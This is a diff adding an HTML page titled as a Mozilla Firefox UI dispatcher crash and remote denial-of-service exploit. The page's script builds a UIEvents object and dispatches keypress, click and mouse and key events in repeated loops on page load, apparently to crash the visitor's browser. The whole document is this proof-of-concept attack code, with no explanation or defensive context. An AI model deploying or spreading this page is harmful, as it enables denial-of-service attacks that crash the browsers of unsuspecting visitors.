@@ -1,0 +1,48 @@
+&lt;html&gt;
+&lt;title&gt;Mozilla Firefox User Interface Dispatcher Crash and Remote Denial of Service&lt;/title&gt;
+&lt;head&gt;
+
+
+&lt;script language = &quot;JavaScript&quot;&gt;
+var moz303 = document.createEvent(&quot;UIEvents&quot;);
+
+moz303.initUIEvent(&quot;keypress&quot;, true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop &lt; 10 ; moz303_loop++)
+{
+	document.documentElement.dispatchEvent(moz303);
+}
+
+
+moz303.initUIEvent(&quot;click&quot;, true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop &lt; 10 ; moz303_loop++)
+{
+	document.documentElement.dispatchEvent(moz303);
+}
+
+moz303.initUIEvent(&quot;onkeydown&quot;, true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop &lt; 10 ; moz303_loop++)
+{
+	document.documentElement.dispatchEvent(moz303);
+}
+
+moz303.initUIEvent(&quot;onkeyup&quot;, true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop &lt; 10 ; moz303_loop++)
+{
+	document.documentElement.dispatchEvent(moz303);
+}
+
+moz303.initUIEvent(&quot;onmousedown&quot;, true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop &lt; 10 ; moz303_loop++)
+{
+	document.documentElement.dispatchEvent(moz303);
+}
+
+moz303.initUIEvent(&quot;onmouseup&quot;, true, true, this, 1);
+for (var moz303_loop = 1 ; moz303_loop &lt; 10 ; moz303_loop++)
+{
+	document.documentElement.dispatchEvent(moz303);
+}
+
+&lt;/script&gt;
+
+&lt;/head&gt;
